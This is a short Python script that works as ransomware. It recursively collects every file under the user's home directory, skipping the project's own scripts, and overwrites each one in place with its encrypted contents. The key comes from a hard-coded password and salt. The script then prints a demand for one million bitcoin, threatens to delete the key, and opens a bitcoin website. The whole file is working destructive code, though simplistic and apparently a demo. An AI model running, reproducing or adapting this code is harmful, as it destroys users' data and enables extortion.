import os
import webbrowser
from utilities import generate_key, encrypt

excluded_dirs = {"env", ".git"}
excluded_files = {
    "decrypt.py",
    "test.py",
    "encrypt.py",
    "utilities.py",
    "key.txt",
    "README.md",
    ".gitignore",
}

files = []

home_dir = os.path.expanduser("~")

for root, dirs, filenames in os.walk(home_dir):
    # comprehension to remove unwanted dirs
    dirs[:] = [d for d in dirs if d not in excluded_dirs]

    for file in filenames:
        if file in excluded_files:
            continue
        files.append(os.path.join(root, file))

print(files)

password = b"nohope1234567890"  # 16 bytes of password
salt = b"sixteen890123456"
secret_key = generate_key(password, salt)

# encrypt
for file in files:
    with open(file, "rb") as _file:
        contents = _file.read()

    enc_content = encrypt(secret_key, contents)

    # Write the e
    with open(file, "wb") as _file:
        _file.write(enc_content)

print("Give me one million bitcoin OR ELSE I WILL DELETE THE KEY FOREVER")
# print("\n", "secret key: ",secret_key)
webbrowser.open("www.bitcoin.com")
